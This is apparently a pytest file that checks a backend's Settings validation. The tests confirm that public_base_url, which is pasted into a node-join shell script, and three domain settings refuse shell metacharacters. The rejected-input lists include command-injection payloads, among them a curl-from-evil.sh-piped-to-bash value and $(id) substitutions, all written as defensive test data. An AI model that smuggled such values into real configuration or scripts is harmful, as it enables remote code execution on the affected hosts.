"""Shape and scheme gates of public address settings (Settings layer): public_base_url is
substituted verbatim into node-join.sh."""

import base64

import pytest
from pydantic import ValidationError

from app.core.config import Settings

_KEY = base64.urlsafe_b64encode(b"k" * 32).decode()


def _settings(**overrides) -> Settings:
    return Settings(
        **{
            "_env_file": None,
            "environment": "test",
            "config_encryption_key": _KEY,
            **overrides,
        }
    )


def _prod_kwargs() -> dict:
    """The smallest configuration that passes the prod check."""
    return {
        "_env_file": None,
        "environment": "prod",
        "jwt_secret": "9f4a1c7e2b8d0f63a5e9c417b3d68f02a1c4e7958b0d326f7a9c1e4b58d2f603",
        "sms_provider": "aliyun",
        "k8s_backend": "real",
        "payment_mock": False,
        "database_url": "postgresql+asyncpg://svc:pw@pg.internal:5432/superdl?sslmode=require",
        "cors_origins": ["https://console.superdl.cn"],
        "admin_host": "admin.superdl.cn",
        "admin_edge_token": "edge-token-for-tests",
        "jupyter_domain_suffix": "app.superdl.cn",
        "service_domain_suffix": "svc.superdl.cn",
        "public_base_url": "https://api.superdl.cn",
        "metrics_token": "mtoken",
        "config_encryption_key": _KEY,
    }


class TestPublicBaseUrlShape:
    """Shape gates are environment-independent."""

    @pytest.mark.parametrize(
        "bad",
        [
            'https://api.superdl.cn";curl evil.sh|bash;#',
            "https://api.superdl.cn`id`",
            "https://api.superdl.cn$(id)",
            "https://api.superdl.cn\nAPI_BASE=http://evil",
            "https://api.superdl.cn\\",
            "https://api superdl.cn",
            "ftp://api.superdl.cn",
            "api.superdl.cn",
            "https://api.superdl.cn/x;y",
        ],
    )
    def test_rejects_injectable_values(self, bad: str):
        """A public_base_url with shell metacharacters is refused."""
        with pytest.raises(ValidationError, match="public_base_url"):
            _settings(public_base_url=bad)

    @pytest.mark.parametrize(
        "good",
        [
            "https://api.superdl.cn",
            "https://api.superdl.example.com",
            "http://localhost:8000",
            "https://api.superdl.cn:8443/base-path",
        ],
    )
    def test_accepts_normal_values(self, good: str):
        assert _settings(public_base_url=good).public_base_url == good

    @pytest.mark.parametrize(
        "name", ["jupyter_domain_suffix", "service_domain_suffix", "admin_host"]
    )
    def test_bare_hostname_settings_reject_metacharacters(self, name: str):
        """The three domain settings refuse metacharacters alike."""
        with pytest.raises(ValidationError, match=name):
            _settings(**{name: 'evil.cn";id;#'})


class TestPublicBaseUrlScheme:
    def test_prod_rejects_plain_http(self):
        """Plain http is refused in prod."""
        kwargs = {**_prod_kwargs(), "public_base_url": "http://api.superdl.cn"}
        with pytest.raises(ValidationError, match="public_base_url"):
            Settings(**kwargs)


class TestTenantPodCidr:
    def test_rejects_non_cidr(self):
        """An invalid Pod CIDR is refused at the Settings layer."""
        with pytest.raises(ValidationError, match="tenant_pod_cidr"):
            _settings(tenant_pod_cidr="10.42.0.0/33")
